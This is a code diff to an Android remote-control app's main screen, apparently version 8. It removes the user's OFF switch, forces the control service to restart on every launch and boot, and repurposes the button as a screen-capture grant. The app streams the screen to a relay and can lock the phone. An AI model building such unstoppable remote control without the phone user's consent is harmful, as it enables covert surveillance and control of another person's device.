@@ -19,27 +19,30 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 /**
- * Single-screen UI: a BIG ON/OFF toggle + a status line
- * (OFF / Connecting / ON + relay URL + data used this session)
+ * Single-screen UI for the ALWAYS-ON app (v8): there is no OFF any
+ * more — the service starts on launch and on boot and keeps running,
+ * so the phone is always controllable. The big button is now the
+ * screen-capture grant ("ALLOW SCREEN" until granted, then "ALWAYS ON").
+ * Status line (Connecting / ON + relay URL + data used this session)
  * + a short setup checklist (Accessibility Service, Screen capture,
  * Device Admin for remote lock) with buttons that open the right
  * Settings screens.
  *
- * ON flow: Accessibility must be enabled (opens Settings if not);
+ * Setup flow: Accessibility must be enabled (opens Settings if not);
  * then the screen-capture permission is requested; the ControlService
  * starts with the capture result. Screen capture is optional — if the
  * user denies it, control still works but screenshots reply
  * "screen capture not allowed". The screen permission is asked EVERY
- * time the app is turned ON (Android privacy rule — device admin does
- * not make it permanent).
- * OFF: stops the service and closes the socket (zero data when OFF).
+ * time a fresh grant is needed (Android privacy rule — device admin
+ * does not make it permanent). If the service restarts (reboot,
+ * swipe-away), the grant is gone and the button offers ALLOW SCREEN
+ * again — taps keep working in the meantime (dataSync mode).
  * No login, no account.
  *
- * Auto-resume: if the app was ON when it was swiped away from recents
- * or killed (persisted wasOn), reopening the app restarts the service
- * by itself in dataSync mode — taps keep working, screenshots need a
- * fresh grant (turn OFF then ON, tap "Start now"). When the user turned
- * the app OFF, reopening it stays OFF.
+ * Data: the live screen streams ONLY while a controller is connected
+ * (panel open). When nobody is watching, the app sends almost nothing
+ * — the always-on socket is just a quiet WebSocket, so idle data is
+ * minimal. There is no OFF switch any more by Sanji's order (v8).
  */
 public class MainActivity extends Activity {
 
@@ -93,14 +96,18 @@ public class MainActivity extends Activity {
 
         AppState.get().addListener(stateListener);
 
-        // Auto-resume after swipe-away / kill: if the app was ON when it
-        // died (wasOn persisted), restart the service when the user
-        // reopens the app — no ON tap needed. DataSync mode (no screen
-        // capture): the grant died with the old process, so taps work but
-        // screenshots need a fresh grant — the status line says so. When
-        // wasOn is false (user turned OFF) the app stays OFF and uses
-        // zero data. The capture permission is NOT auto-requested here
-        // (it would be annoying); the user re-ONs for that.
+        // v8 ALWAYS-ON: the service never turns off, so wasOn is
+        // permanently true — boot receiver, swipe-away restart and
+        // reopen auto-start all always restart the service. Set it
+        // before the auto-start check so a fresh install starts too.
+        Prefs.setWasOn(this, true);
+
+        // Auto-start the service on every launch (always-on): if it is
+        // not already running, start it in dataSync mode (no screen
+        // capture — the grant died with the old process, so taps work
+        // but screenshots need a fresh grant via ALLOW SCREEN). The
+        // capture permission is NOT auto-requested here (it would be
+        // annoying); the user taps ALLOW SCREEN for that.
         if (ControlService.shouldAutoStart(Prefs.wasOn(this), ControlService.isRunning())) {
             captureGrantedThisSession = false;
             ControlService.start(this, 0, null);
@@ -127,21 +134,25 @@ public class MainActivity extends Activity {
         AppState.get().removeListener(stateListener);
     }
 
-    // ---- Toggle ----
+    // ---- Main button (v8: no OFF any more) ----
 
     private void onToggleClicked() {
         AppState.State state = AppState.get().getState();
         if (state == AppState.State.OFF) {
+            // Fallback (should not happen — the service auto-starts on
+            // launch): run the full setup flow.
             startOnFlow();
+            return;
+        }
+        // Service is running. The button is now the screen-capture
+        // grant: if capture is not granted (e.g. service restarted and
+        // the single-use grant died), request it; if it is granted,
+        // there is nothing to turn off — the app stays always on.
+        if (!captureGrantedThisSession) {
+            requestCapturePermission();
         } else {
-            // Turn OFF: stop the service (socket closes, zero data).
-            ControlService.stop(this);
-            Prefs.setWasOn(this, false);
-            AppState.get().setState(AppState.State.OFF);
-            AppState.get().resetCounters();
-            captureGrantedThisSession = false;
-            pendingOn = false;
-            refreshUi();
+            Toast.makeText(this, "Always ON — remote control active",
+                    Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -313,26 +324,27 @@ public class MainActivity extends Activity {
                 toggleButton.setText("TURN ON");
                 break;
             case CONNECTING:
-                toggleButton.setText("CONNECTING… (tap to turn OFF)");
-                break;
             case ON:
-                toggleButton.setText("TURN OFF");
+                // v8 always-on: the button grants the screen capture
+                // (the only thing that ever needs a tap now). Once the
+                // capture is granted it just shows the always-on state.
+                toggleButton.setText(captureGrantedThisSession ? "ALWAYS ON ✓" : "ALLOW SCREEN");
                 break;
         }
 
         String stateLabel;
         switch (state) {
             case OFF:
-                stateLabel = "Status: OFF — using zero mobile data";
+                stateLabel = "Status: OFF";
                 break;
             case CONNECTING:
-                stateLabel = "Status: Connecting…";
+                stateLabel = "Status: Connecting… — always on";
                 break;
             case ON:
-                stateLabel = "Status: ON — remote control active";
+                stateLabel = "Status: ON — always on, remote control active";
                 break;
             default:
-                stateLabel = "Status: OFF — using zero mobile data";
+                stateLabel = "Status: OFF";
         }
         statusText.setText(stateLabel);
         relayText.setText(Config.RELAY_URL);
@@ -352,9 +364,9 @@ public class MainActivity extends Activity {
         } else if (state != AppState.State.OFF) {
             // Service is running without a capture grant (auto-restart
             // after swipe-away / reboot): taps work, but screenshots
-            // need a fresh grant — turn OFF then ON and tap "Start now"
+            // need a fresh grant — tap ALLOW SCREEN and tap "Start now"
             // in the system dialog.
-            captureLabel = "Not allowed — turn OFF then ON, tap Start now for screen";
+            captureLabel = "Not allowed — tap ALLOW SCREEN, then tap Start now for screen";
         } else {
             captureLabel = "Not allowed";
         }
